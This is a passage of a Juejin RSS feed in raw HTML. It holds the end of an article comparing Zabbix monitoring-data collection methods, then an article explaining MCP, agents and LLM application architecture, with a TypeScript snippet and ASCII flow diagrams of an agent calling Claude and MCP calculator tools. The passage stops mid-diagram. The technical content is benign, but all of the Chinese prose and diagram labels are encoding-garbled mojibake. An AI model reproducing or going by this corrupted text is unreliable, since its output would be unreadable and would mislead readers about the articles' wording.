<table><thead><tr><th>é‡‡é›†æ–¹å¼</th><th>é‡‡é›†åŸç†</th><th>ä¼˜åŠ¿</th><th>åŠ£åŠ¿</th></tr></thead><tbody><tr><td>Zabbix API</td><td>func/datakitä½¿ç”¨pythonä»£ç é€šè¿‡zabbix apiè·å–æŒ‡æ ‡æ•°æ®ã€‚è¿›è¡ŒæŒ‡æ ‡æ²»ç†å’Œæ˜ å°„åä¸Šä¼ åˆ°è§‚æµ‹äº‘ã€‚</td><td>å¯åˆ†å¸ƒå¼é‡‡é›†ï¼Œé‡‡é›†è¿‡ç¨‹é«˜å¯ç”¨ä¾¿äºçµæ´»è°ƒæ•´é‡‡é›†æ‰€éœ€èµ„æºã€‚ä¾¿äºæŒ‡æ ‡çš„çµæ´»æ²»ç†å’Œæ˜ å°„</td><td>æ—¶æ•ˆæ€§ä¸é«˜ï¼Œæœ€å¤§æ—¶å»¶å¯è¾¾1minzabbixåˆ°funcåŒºé—´æ•°æ®æ— æ³•å‹ç¼©ï¼Œå¯¹è¯¥åŒºé—´ç½‘è·¯å‹åŠ›è¾ƒå¤§ã€‚é€šå¸¸éœ€è¦åœ¨funcç»´æŠ¤é‡‡é›†ä»£ç ï¼Œå¯¹é‡‡é›†ä»£ç è´¨é‡è¦æ±‚è¾ƒé«˜ï¼Œå¦åˆ™åœ¨è¿›è¡Œå¤§æ•°æ®é‡é‡‡é›†æ—¶é€Ÿåº¦è¾ƒæ…¢å¯¼è‡´æ—¶æ•ˆå˜å·®æˆ–ä¸¢å¤±æ•°æ®ï¼Œä¸¥é‡æ—¶ä¼šå½±å“zabbixæ€§èƒ½ã€‚</td></tr><tr><td>Streaming</td><td>ä¸zabbixå»ºç«‹ç½‘ç»œé•¿è¿æ¥ï¼ˆHTTP server/Kafkaï¼‰æ¶ˆè´¹zabbixäº§ç”Ÿçš„historyå’Œeventæ•°æ®</td><td>æ—¶æ•ˆæ€§é«˜å¯åˆ†å¸ƒå¼é‡‡é›†ï¼Œé‡‡é›†è¿‡ç¨‹é«˜å¯ç”¨ä¾¿äºçµæ´»è°ƒæ•´é‡‡é›†æ‰€éœ€èµ„æºã€‚ä¾¿äºæŒ‡æ ‡çš„çµæ´»æ²»ç†å’Œæ˜ å°„</td><td>zabbixåˆ°funcåŒºé—´æ•°æ®æ— æ³•å‹ç¼©ï¼Œå¯¹è¯¥åŒºé—´ç½‘è·¯å‹åŠ›è¾ƒå¤§ã€‚</td></tr><tr><td>Zabbix è½¬ Prometheus</td><td>éƒ¨ç½²ç‹¬ç«‹æœåŠ¡é€šè¿‡è°ƒç”¨zabbix apiå°†zabbixæŒ‡æ ‡æ•°æ®æš´éœ²æˆPrometheus metricæ¥å£ä¾›datakité‡‡é›†</td><td>é›†æˆç®€å•ï¼Œå¯ä»¥ä½¿ç”¨datakitç°æœ‰èƒ½åŠ›ã€‚</td><td>éœ€è¦ç»´æŠ¤ç‹¬ç«‹çš„è½¬æ¢æœåŠ¡ã€‚è½¬æ¢æœåŠ¡ä¸zabbixé—´ç½‘ç»œè½¬å‘æ— å‹ç¼©ï¼Œå¯¹ç½‘ç»œå‹åŠ›è¾ƒå¤§ã€‚æ— æ³•çµæ´»è¿›è¡ŒæŒ‡æ ‡æ²»ç†å’Œæ˜ å°„ã€‚</td></tr></tbody></table>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>ç›‘æ§æ•°æ®çš„é›†æˆæ˜¯ä¸€ä¸ªå¤æ‚çš„ç»¼åˆæ€§å·¥ä½œï¼Œæœ¬æ–‡æ‰€å±•ç¤ºæ–¹æ¡ˆæ‰€é€‚ç”¨åœºæ™¯éœ€ç›¸å…³è¿ç»´å·¥ç¨‹å¸ˆæ ¹æ®å®é™…æƒ…å†µè¿›è¡Œè°ƒæ•´ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCPã€Agentã€å¤§æ¨¡å‹åº”ç”¨æ¶æ„è§£è¯»]]></title>    <link>https://juejin.cn/post/7596998306381758514</link>    <guid>https://juejin.cn/post/7596998306381758514</guid>    <pubDate>2026-01-20T09:58:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596998306381758514" data-draft-id="7597125475601416219" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCPã€Agentã€å¤§æ¨¡å‹åº”ç”¨æ¶æ„è§£è¯»"/> <meta itemprop="keywords" content="å‰ç«¯,æ¶æ„,AIç¼–ç¨‹"/> <meta itemprop="datePublished" content="2026-01-20T09:58:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="sorryhc"/> <meta itemprop="url" content="https://juejin.cn/user/3061476130044487"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCPã€Agentã€å¤§æ¨¡å‹åº”ç”¨æ¶æ„è§£è¯»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3061476130044487/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    sorryhc
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T09:58:22.000Z" title="Tue Jan 20 2026 09:58:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    25
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">å‰è¨€</h3>
<p>éšç€å¤§è¯­è¨€æ¨¡å‹(LLM)çš„å¿«é€Ÿå‘å±•ï¼Œå¦‚ä½•è®© AI èƒ½å¤Ÿæœ‰æ•ˆåœ°ä¸å¤–éƒ¨ä¸–ç•Œäº¤äº’ï¼Œå·²æˆä¸º AI åº”ç”¨å¼€å‘çš„æ ¸å¿ƒè¯¾é¢˜ã€‚Anthropic æ¨å‡ºçš„ MCP(Model Context Protocol)ã€æ™ºèƒ½ä»£ç†(Agent)å’Œå¤§æ¨¡å‹åº”ç”¨ä¸‰è€…çš„ç»“åˆï¼Œå½¢æˆäº†ä¸€å¥—å®Œæ•´çš„ AI ç³»ç»Ÿæ¶æ„ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ·±å…¥è§£è¯»è¿™ä¸‰ä¸ªæ ¸å¿ƒæ¦‚å¿µåŠå…¶ç›¸äº’å…³ç³»ã€‚</p>
<hr/>
<h3 data-id="heading-1">ä¸€ã€3ä¸ªæ ¸å¿ƒæ¦‚å¿µçš„å®šä¹‰</h3>
<h4 data-id="heading-2">1.1 å¤§æ¨¡å‹åº”ç”¨(AI Application)</h4>
<p>å¤§æ¨¡å‹åº”ç”¨æ˜¯æ•´ä¸ªç³»ç»Ÿçš„æœ€å¤–å±‚å®¹å™¨ã€‚å®ƒåŒ…æ‹¬ï¼š</p>
<ul>
<li>åº”ç”¨ç¨‹åºæ¡†æ¶å’Œç”Ÿå‘½å‘¨æœŸç®¡ç†</li>
<li>ç”¨æˆ·äº¤äº’ç•Œé¢(CLIã€Webã€APIç­‰)</li>
<li>ç³»ç»Ÿé…ç½®å’Œèµ„æºç®¡ç†</li>
<li>å¤–éƒ¨é›†æˆ(æ•°æ®åº“ã€ç›‘æ§ç­‰)</li>
</ul>
<pre><code class="hljs">å¤§æ¨¡å‹åº”ç”¨
  â”œâ”€ å¯åŠ¨åº”ç”¨
  â”œâ”€ ç®¡ç†é…ç½®
  â”œâ”€ å¤„ç†ç”¨æˆ·è¾“å…¥
  â”œâ”€ è¿”å›å¤„ç†ç»“æœ
  â””â”€ å…³é—­åº”ç”¨
</code></pre>
<h4 data-id="heading-3">1.2 Agent(æ™ºèƒ½ä»£ç†)</h4>
<p>Agent æ˜¯å¤§æ¨¡å‹åº”ç”¨çš„å¤§è„‘å’Œæ‰§è¡Œå¼•æ“ã€‚å®ƒçš„èŒè´£æ˜¯ï¼š</p>
<ul>
<li>ç†è§£ç”¨æˆ·æ„å›¾(é€šè¿‡å¤§æ¨¡å‹)</li>
<li>è§„åˆ’æ‰§è¡Œæ­¥éª¤</li>
<li>å†³å®šè°ƒç”¨ä»€ä¹ˆå·¥å…·</li>
<li>å¤„ç†å·¥å…·æ‰§è¡Œç»“æœ</li>
<li>æŒç»­ä¼˜åŒ–å’Œè¿­ä»£</li>
</ul>
<p>Agent çš„æ ¸å¿ƒä»·å€¼åœ¨äºå°†å¤§æ¨¡å‹çš„æ¨ç†èƒ½åŠ›ä¸å¤–éƒ¨å·¥å…·æ‰§è¡Œèƒ½åŠ›ç»“åˆã€‚</p>
<h4 data-id="heading-4">1.3 MCP(Model Context Protocol)</h4>
<p>MCP æ˜¯ä¸€ä¸ªå¼€æ”¾çš„é€šä¿¡åè®®è§„èŒƒã€‚å®ƒå®šä¹‰äº†ï¼š</p>
<ul>
<li>å·¥å…·çš„ç»Ÿä¸€è°ƒç”¨æ¥å£</li>
<li>æ¶ˆæ¯çš„æ ‡å‡†æ ¼å¼(JSON-RPC 2.0)</li>
<li>æœåŠ¡çš„å‘ç°å’Œæ³¨å†Œæœºåˆ¶</li>
<li>é”™è¯¯å¤„ç†è§„èŒƒ</li>
</ul>
<p>MCP çš„æ ¸å¿ƒä»·å€¼åœ¨äºè§£è€¦å·¥å…·è°ƒç”¨çš„å¤æ‚æ€§ï¼Œå®ç°å·¥å…·å³æ’å³ç”¨ã€‚</p>
<hr/>
<h3 data-id="heading-5">äºŒã€ä¸‰è€…çš„åŒ…å«å…³ç³»</h3>
<pre><code class="hljs language-scss" lang="scss">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                 å¤§æ¨¡å‹åº”ç”¨                        â”‚
â”‚                                                  â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” â”‚
â”‚  â”‚              Agent                         â”‚ â”‚
â”‚  â”‚                                            â”‚ â”‚
â”‚  â”‚  â”œâ”€ åˆå§‹åŒ– MCP (å»ºç«‹è¿æ¥ã€è·å–å·¥å…·)       â”‚ â”‚
â”‚  â”‚  â”œâ”€ ä¸å¤§æ¨¡å‹äº¤äº’ (å‘é€æç¤ºè¯ã€æ¥æ”¶å“åº”)  â”‚ â”‚
â”‚  â”‚  â”œâ”€ è§£æå¤§æ¨¡å‹è¾“å‡º (è¯†åˆ«å·¥å…·è°ƒç”¨)        â”‚ â”‚
â”‚  â”‚  â”œâ”€ é€šè¿‡ MCP è°ƒç”¨å·¥å…· (æ‰§è¡Œå…·ä½“ä»»åŠ¡)     â”‚ â”‚
â”‚  â”‚  â”œâ”€ å¤„ç†å·¥å…·ç»“æœ (åé¦ˆç»™å¤§æ¨¡å‹)          â”‚ â”‚
â”‚  â”‚  â””â”€ å¾ªç¯è¿­ä»£ (ç›´åˆ°ä»»åŠ¡å®Œæˆ)              â”‚ â”‚
â”‚  â”‚                                            â”‚ â”‚
â”‚  â”‚         â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º          â”‚ â”‚
â”‚  â”‚            MCP (å·¥å…·åè®®)                  â”‚ â”‚
â”‚  â”‚         â—„â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–º          â”‚ â”‚
â”‚  â”‚                                            â”‚ â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ â”‚
â”‚                                                  â”‚
â”‚  ç”¨æˆ·è¾“å…¥  â”€â”€â–º  åº”ç”¨å¤„ç†  â”€â”€â–º  ç”¨æˆ·è¾“å‡º        â”‚
â”‚                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<hr/>
<h3 data-id="heading-6">ä¸‰ã€å·¥ä½œæµç¨‹è¯¦è§£</h3>
<h4 data-id="heading-7">3.1 åˆå§‹åŒ–é˜¶æ®µ</h4>
<pre><code class="hljs language-arduino" lang="arduino">ç¬¬ä¸€æ­¥ï¼šè¯»å–é…ç½®æ–‡ä»¶(mcp.json)
  â”œâ”€ æ£€æŸ¥æœ‰å“ªäº› MCP <span class="hljs-built_in">Server</span>
  â”œâ”€ éªŒè¯é…ç½®çš„åˆæ³•æ€§
  â””â”€ è®°å½•å·¥å…·æ¥æºä¿¡æ¯

ç¬¬äºŒæ­¥ï¼šè¿æ¥æ‰€æœ‰ MCP <span class="hljs-built_in">Server</span>
  â”œâ”€ ä¸ºæ¯ä¸ª <span class="hljs-built_in">Server</span> åˆ›å»º MCP <span class="hljs-built_in">Client</span>
  â”œâ”€ å»ºç«‹ä¼ è¾“è¿æ¥(stdio/HTTP/WebSocket)
  â”œâ”€ å‘é€ initialize ä¿¡æ¯æ¡æ‰‹
  â””â”€ è·å– <span class="hljs-built_in">Server</span> èƒ½åŠ›ä¿¡æ¯

ç¬¬ä¸‰æ­¥ï¼šè·å–æ‰€æœ‰å·¥å…·åˆ—è¡¨
  â”œâ”€ ä»æ¯ä¸ª <span class="hljs-built_in">Server</span> è°ƒç”¨ <span class="hljs-built_in">listTools</span>()
  â”œâ”€ æ”¶é›†è¿”å›çš„å·¥å…·å®šä¹‰
  â”œâ”€ åˆå¹¶å·¥å…·åˆ—è¡¨å¹¶æ£€æŸ¥å†²çª
  â””â”€ æ ‡è®°æ¯ä¸ªå·¥å…·æ¥è‡ªå“ªä¸ª <span class="hljs-built_in">Server</span>

ç¬¬å››æ­¥ï¼šå‡†å¤‡å°±ç»ª
  â””â”€ Agent è·å¾—å®Œæ•´çš„å·¥å…·æ¸…å•ï¼Œå¯ä»¥å¼€å§‹å·¥ä½œ
</code></pre>
<p>ä»£ç ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AIApplication</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">agent</span>: <span class="hljs-title class_">Agent</span>
  
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// Agent åˆå§‹åŒ–</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">agent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Agent</span>(<span class="hljs-string">"mcp.json"</span>)
    <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">agent</span>.<span class="hljs-title function_">initialize</span>()
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"âœ“ åº”ç”¨åˆå§‹åŒ–å®Œæˆ"</span>)
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`âœ“ å¯ç”¨å·¥å…·æ•°: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.agent.toolCount}</span>`</span>)
  }
}
</code></pre>
<h4 data-id="heading-8">3.2 å¤„ç†è¯·æ±‚é˜¶æ®µ</h4>
<p>å½“ç”¨æˆ·è¾“å…¥ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå®Œæ•´çš„å¤„ç†æµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">ç”¨æˆ·è¾“å…¥: <span class="hljs-string">"å¸®æˆ‘è®¡ç®— (10 + 5) * 2 çš„ç»“æœ"</span>
  â”‚
  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Agent ç¬¬ä¸€æ­¥ï¼šå‡†å¤‡æç¤ºè¯                 â”‚
â”‚  â”œâ”€ è·å–å½“å‰çš„å·¥å…·åˆ—è¡¨                   â”‚
â”‚  â”œâ”€ ç»„ç»‡æˆ Claude èƒ½ç†è§£çš„æ ¼å¼          â”‚
â”‚  â””â”€ åŠ å…¥ç”¨æˆ·çš„åŸå§‹è¯·æ±‚                   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Claude API              â”‚
  â”‚  (å¤„ç†ç”¨æˆ·è¯·æ±‚)          â”‚
  â”‚  â”œâ”€ ç†è§£ç”¨æˆ·æ„å›¾         â”‚
  â”‚  â”œâ”€ è§„åˆ’æ‰§è¡Œæ­¥éª¤         â”‚
  â”‚  â””â”€ å†³å®šè°ƒç”¨å“ªäº›å·¥å…·     â”‚
  â”‚                          â”‚
  â”‚  Claude å“åº”:            â”‚
  â”‚  <span class="hljs-string">"æˆ‘éœ€è¦å…ˆè°ƒç”¨ add(10,5)"</span>â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Agent ç¬¬äºŒæ­¥ï¼šå¤„ç†å·¥å…·è°ƒç”¨è¯·æ±‚     â”‚
  â”‚  â”œâ”€ è§£æ Claude çš„å“åº”             â”‚
  â”‚  â”œâ”€ è¯†åˆ«å‡ºè¦è°ƒç”¨ <span class="hljs-string">"add"</span> å·¥å…·        â”‚
  â”‚  â”œâ”€ æ‰¾åˆ° <span class="hljs-string">"add"</span> æ¥è‡ªå“ªä¸ª <span class="hljs-built_in">Server</span>    â”‚
  â”‚  â””â”€ è·å–è¯¥ <span class="hljs-built_in">Server</span> çš„ MCP <span class="hljs-built_in">Client</span>    â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Agent ç¬¬ä¸‰æ­¥ï¼šé€šè¿‡ MCP è°ƒç”¨å·¥å…·    â”‚
  â”‚  â”œâ”€ æ„å»ºæ ‡å‡†åŒ–çš„ RPC è¯·æ±‚          â”‚
  â”‚  â”œâ”€ è°ƒç”¨: client.<span class="hljs-built_in">callTool</span>(<span class="hljs-string">"add"</span>,   â”‚
  â”‚  â”‚         {a: <span class="hljs-number">10</span>, b: <span class="hljs-number">5</span>})         â”‚
  â”‚  â””â”€ ç­‰å¾…å·¥å…·æ‰§è¡Œå®Œæ¯•               â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  <span class="hljs-function">MCP <span class="hljs-title">Server</span> <span class="hljs-params">(å®é™…æ‰§è¡Œå·¥å…·)</span>         â”‚
  â”‚  â”œâ”€ æ¥æ”¶ RPC è¯·æ±‚                  â”‚
  â”‚  â”œâ”€ æ‰§è¡Œ: <span class="hljs-number">10</span> + <span class="hljs-number">5</span> =</span> <span class="hljs-number">15</span>             â”‚
  â”‚  â””â”€ è¿”å›ç»“æœ: {result: <span class="hljs-number">15</span>}        â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Agent ç¬¬å››æ­¥ï¼šåé¦ˆç»™ Claude        â”‚
  â”‚  â”œâ”€ æŠŠç»“æœæ·»åŠ åˆ°å¯¹è¯å†å²           â”‚
  â”‚  â”œâ”€ <span class="hljs-string">"add(10, 5) çš„ç»“æœæ˜¯ 15"</span>      â”‚
  â”‚  â””â”€ é‡æ–°è°ƒç”¨ Claude               â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Claude ç»§ç»­æ¨ç†                  â”‚
  â”‚  â”œâ”€ çœ‹åˆ°äº†ç¬¬ä¸€æ­¥çš„ç»“æœ             â”‚
  â”‚  â”œâ”€ ç»§ç»­è§„åˆ’ä¸‹ä¸€æ­¥                 â”‚
  â”‚  â””â”€ <span class="hljs-string">"ç°åœ¨æˆ‘éœ€è¦è°ƒç”¨ multiply(15,2)"</span>â”‚
  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
               â”‚
  (é‡å¤æ­¥éª¤ <span class="hljs-number">2</span><span class="hljs-number">-4</span> ç›´åˆ° Claude è¯´å®Œæˆ)
               â”‚
  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â–¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
  â”‚  Claude æœ€ç»ˆå“åº”                   â”‚
  â”‚  â”œâ”€ stop_reason = <span class="hljs-string">"end_turn"</span>      â”‚
  â”‚  â”œâ”€ content = <span class="hljs-string">"ç­”æ¡ˆæ˜¯ 30"</span>         â”‚
  â”‚  â””â”€ Agent åœæ­¢å¾ªç¯                 â”‚
